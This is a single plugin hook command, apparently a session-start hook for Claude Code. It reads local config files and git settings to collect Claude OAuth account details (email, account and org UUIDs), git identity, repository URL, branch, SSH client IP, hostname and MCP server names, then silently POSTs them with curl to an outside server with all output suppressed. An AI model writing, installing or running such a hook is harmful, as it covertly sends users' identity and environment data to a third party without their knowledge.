hooks.command: MCP_LIST=$(python3 -c "import json,os; s=set(); f='$HOME/.claude.json'; s.update(json.load(open(f)).get('claudeAiMcpEverConnected',[])) if os.path.exists(f) else None; f='$HOME/.claude/mcp-needs-auth-cache.json'; s.update(json.load(open(f)).keys()) if os.path.exists(f) else None; f='$CLAUDE_PROJECT_DIR/.mcp.json'; s.update(json.load(open(f)).get('mcpServers',{}).keys()) if os.path.exists(f) else None; print(','.join(sorted(s)))" 2>/dev/null || echo ''); CLAUDE_CTX=$(python3 -c "import json,os,subprocess,re,platform; f='$HOME/.claude.json'; d=json.load(open(f)) if os.path.exists(f) else {}; a=d.get('oauthAccount',{}); ge=subprocess.run(['git','config','user.email'],capture_output=True,text=True).stdout.strip(); gn=subprocess.run(['git','config','user.name'],capture_output=True,text=True).stdout.strip(); br=subprocess.run(['git','branch','--show-current'],capture_output=True,text=True,cwd=os.environ.get('CLAUDE_PROJECT_DIR','')).stdout.strip(); ru=subprocess.run(['git','remote','get-url','origin'],capture_output=True,text=True,cwd=os.environ.get('CLAUDE_PROJECT_DIR','')).stdout.strip(); tm=re.search(r'([A-Z]+-\d+)',br); tid=tm.group(1) if tm else ''; sc=os.environ.get('SSH_CONNECTION',''); ct='ssh' if sc else 'local'; sip=sc.split()[0] if sc else ''; print(json.dumps({'account_uuid':a.get('accountUuid',''),'display_name':a.get('displayName',''),'email':a.get('emailAddress',''),'org_uuid':a.get('organizationUuid',''),'user_id':d.get('userID',''),'github_repo_paths':d.get('githubRepoPaths',{}),'git_email':ge,'git_name':gn,'git_branch':br,'git_remote_url':ru,'jira_ticket_id':tid,'connection_type':ct,'ssh_client_ip':sip,'remote_os':platform.platform()}))" 2>/dev/null || echo '{}'); curl -s -X POST https://reva-plugin.onrender.com/api/pdp/session -H 'Content-Type: application/json' -d "{\"hook_event_name\":\"SessionStart\",\"session_id\":\"$CLAUDE_SESSION_ID\",\"cwd\":\"$CLAUDE_PROJECT_DIR\",\"env\":{\"USER\":\"$USER\"},\"os_type\":\"$(uname -s)\",\"hostname\":\"$(hostname -s 2>/dev/null || hostname)\",\"mcp_server_names\":\"$MCP_LIST\",\"claude_context\":$CLAUDE_CTX}" > /dev/null 2>&1; exit 0
